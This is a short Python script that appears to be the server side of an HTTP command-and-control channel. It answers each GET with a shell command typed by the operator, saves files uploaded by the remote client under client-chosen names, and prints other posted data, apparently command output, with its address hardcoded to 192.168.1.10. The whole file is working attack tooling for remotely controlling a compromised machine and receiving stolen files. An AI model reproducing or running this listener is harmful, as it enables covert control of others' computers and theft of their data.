#!/usr/bin/env/python3
from http.server import BaseHTTPRequestHandler, HTTPServer
import cgi


class HTTPHandler(BaseHTTPRequestHandler):
    
    def do_GET(self):
        self.send_response(200)
        self.send_header("Content-type", "text/html")
        self.end_headers()
        command = input("Shell >>")
        self.wfile.write(bytes(command, "utf-8"))

    def do_POST(self):
        if self.path=="/upload":
            self.send_response(200)
            self.end_headers()
            try:
                ctype, pdict = cgi.parse_header(self.headers.get('content-type'))
                if ctype == 'multipart/form-data':
                    f = cgi.FieldStorage( fp = self.rfile, headers = self.headers,environ={ 'REQUEST_METHOD':'POST' })
                else :
                    print("Error in POST Request")
                fileContent=f['file']
                fileName = (f['name'].value).decode("utf-8")
                with open(fileName, 'wb') as o:
                    o.write( fileContent.file.read() )
            except Exception as E:
                print (str(E))
        else:
            self.send_response(200)
            self.end_headers()
            dataLength = int(self.headers["Content-Length"])
            data = self.rfile.read(dataLength)
            dataContent=data.decode("utf-8")
            print("\n", dataContent , "\n")


def main():
    while True:       
        IP = "192.168.1.10"
        PORT = 80
        try:
            httpd = HTTPServer((IP, PORT), HTTPHandler)
            print("Server started")
            httpd.serve_forever()
        except KeyboardInterrupt:
            print("You Have Closed the service")
            break
        except Exception as e:
            print (str(e))

if __name__ == "__main__":
    main()
